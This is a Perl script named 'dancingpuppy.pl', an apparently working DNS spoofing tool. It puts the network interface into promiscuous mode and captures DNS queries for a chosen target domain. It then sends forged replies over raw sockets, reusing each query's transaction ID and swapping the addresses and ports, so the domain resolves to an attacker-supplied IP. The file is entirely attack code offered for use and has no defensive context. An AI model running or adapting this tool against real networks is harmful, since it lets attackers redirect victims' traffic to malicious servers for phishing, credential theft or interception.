###########################
Filename: dancingpuppy.pl
Developer: Geoff Ellis
Version: 0.01a
Args: domain ipaddr
###########################

use NetPacket::Ethernet qw(:strip);
use NetPacket::IP;
use NetPacket::UDP;
use Net::PcapUtils;
use Net::DNS;
use Net::RawIP;

$target = $ARGV[0];
$webserver = $ARGV[1];

sub process_pkt {
	my ($user_data,$header,$packet) = @_;

    $ip = NetPacket::IP->decode(eth_strip($packet));
   	$srcip = $ip->{src_ip}; 					# Source IP of the captured packet
   	$dstip = $ip->{dest_ip};					# Destination IP of the captured packet

   	$udp = NetPacket::UDP->decode($ip->{data});
   	$srcport = $udp->{src_port};					# Source Port of the captured packet
   	$dstport = $udp->{dest_port};					# Destination Port of the captured packet

   	if($dstport == 53) {						# Check that the packet is destined for a DNS server
        $payload = $udp->{data};
		$tid = unpack('n', substr($payload,0,2));		# Get the transaction ID from within the payload
		$payload =~s/[\x00-\x1F]+/./g;				# Convert all non-printable characters to ASCII
		if ($payload =~ /$target/) {				# Check the payload for our target domain      				       
		    my $dns_response = Net::DNS::Packet->new($target, "A", "IN");
			$dns_response->header->qr(1);
			$dns_response->header->id($tid);
        	$dns_response->push("pre", rr_add($target . ". 86400  A " . $webserver));

			my $dns_data = $dns_response->data;

			my $udp_response = new Net::RawIP({
               	ip=> {
					saddr=>$dstip,			# Set the source address from the destination IP
					daddr=>$srcip			# Set the destination address from the source IP
				},
				udp=>{
					source=>$dstport,		# Set the source port from the destination port
					dest=>$srcport			# Set the destination port from the source port
				}
			});
			$udp_response->set({
				udp=>{
					data=>$dns_data
				}
			});
			$udp_response->send(1, 1);
		}
	}
}

Net::PcapUtils::loop(\&process_pkt,
	SNAPLEN => 65536,
	PROMISC => 1,
);
